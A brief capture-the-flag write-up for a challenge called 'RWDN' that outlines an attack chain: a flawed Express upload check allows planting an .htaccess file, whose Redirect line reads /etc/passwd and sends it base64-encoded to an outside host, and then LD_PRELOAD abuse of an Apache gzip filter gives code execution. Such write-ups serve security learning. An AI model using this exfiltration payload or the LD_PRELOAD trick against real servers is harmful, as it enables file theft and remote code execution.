# RWDN

- In check.js each `req.files` is checked but `next()` is called in each iteration which causes express to continue
- If a lot of valid files are uploaded then `app.post('/upload'` will be processes with our invalid `req.files[req.query.formid]`
- Using ^ we ca upload an .htaccess file
- Can read arbitrary files using something like `Redirect 307 "http://aw.rs/?%{base64:%{file:/etc/passwd}}"`
- Reading the apache.conf there is `ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip`
- This output filter can be combined with `SetEnv LD_PRELOAD` to get code execution when running gzip
- See [solv.py](./solv.py)
